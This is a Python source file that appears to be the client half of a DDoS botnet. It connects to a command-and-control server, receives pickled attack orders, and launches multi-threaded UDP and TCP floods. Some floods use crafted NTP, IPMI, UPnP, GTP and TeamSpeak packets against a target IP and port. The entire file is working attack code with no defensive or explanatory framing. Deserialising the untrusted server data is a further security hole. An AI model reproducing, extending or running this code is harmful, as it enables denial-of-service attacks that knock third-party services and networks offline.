import socket
import os
import pickle
import sys
import time
import threading
import random

def msgrec(conn):
    while True:
        msg = conn.recv(99)
        if not msg.decode('utf-8') == '\r\n':break
    return msg.decode('UTF-8').strip()
if not len(sys.argv) == 3:
    print(f"Usage: python3 {sys.argv[0]} [CnC IP] [CnC Port]")
    sys.exit()
CNCIP = sys.argv[1]
CNCPORT = int(sys.argv[2])
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((CNCIP,CNCPORT))

def method_ntp(ip,port,attacktime):
    timeout = time.time() + attacktime
    os.system(f'./ntp {ip} {port} ntpout.txt 100 -1 {attacktime}')
    sys.exit()
def method_std(ip,port,attacktime):
    data = random._urandom(1024)
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        flood.sendto(data,addr)
    flood.close()
    sys.exit()
def method_RCMP(ip,port,attacktime):
    data = ['\x06\x00\xff\x06','\x00\x00\x11\xbe','\x80\x00\x00\x00']
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        for i in range(3):
            flood.sendto(data[i],addr)
    flood.close()
    sys.exit()
def method_IPMI(ip,port,attacktime):
    data = ['\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18','\xc8\x81\x00\x38\x8e\x04\xb5']
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        for i in range(2):
            flood.sendto(data[i],addr)
    flood.close()
    sys.exit()
def method_UPNP(ip,port,attacktime):
    data = ['\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA3','\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00','\x00\x00\x00\x00\x00\x00\x00\x00']
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        for i in range(3):
            flood.sendto(data[i],addr)
    flood.close()
    sys.exit()
def method_GTP1(ip,port,attacktime):
    data = ['\x32','\x01','\x00\x04','\x00\x00\x42\x00','\x13\x37','\x00','\x00']
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        for i in range(7):
            flood.sendto(data[i],addr)
    flood.close()
    sys.exit()
def method_GTP2(ip,port,attacktime):
    data = ['\x4e','\x01','\x00\x04','\xde\xfe\xc8\x00']
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        for i in range(4):
            flood.sendto(data[i],addr)
    flood.close()
    sys.exit()
def method_ts2(ip,port,attacktime):
    data = '\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout = time.time() + attacktime
    while True:
        if time.time() > timeout:
            break
        flood.sendto(data,addr)
    flood.close()
    sys.exit()
def method_tcprand(ip,port,attacktime):
    data = random._urandom(16)
    addr = (ip,port)
    flood = socket.socket(socket.AF_INET,socket.SOCK_STREAN)
    timeout = time.time() + attacktime
    flood.connect(addr)
    while True:
        if time.time() > timeout:
            break
        flood.send(data)
    flood.close()
    sys.exit()
while True:
    data = sock.recv(99)
    try:
        if data.decode('UTF-8') == 'foo':
            sock.sendall(b'bar')
    except:
        attack = pickle.loads(data)
        if attack[0] == 'NTP':
            th = threading.Thread(target=method_ntp, args=[attack[1],attack[2],attack[3]])
            th.start()
        elif attack[0] == 'STD':
            for a in range(100):
                th = threading.Thread(target=method_std, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'UPNP':
            for a in range(100):
                th = threading.Thread(target=method_UPNP, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'RCMP':
            for a in range(100):
                th = threading.Thread(target=method_RCMP, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'IPMI':
            for a in range(100):
                th = threading.Thread(target=method_IPMI, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'TCPRAND':
            for a in range(100):
                th = threading.Thread(target=method_tcprand, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'TS2':
            for a in range(100):
                th = threading.Thread(target=method_ts2, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'GTP1':
            for a in range(100):
                th = threading.Thread(target=method_GTP1, args=[attack[1],attack[2],attack[3]])
                th.start()
        elif attack[0] == 'GTP2':
            for a in range(100):
                th = threading.Thread(target=method_GTP2, args=[attack[1],attack[2],attack[3]])
                th.start()
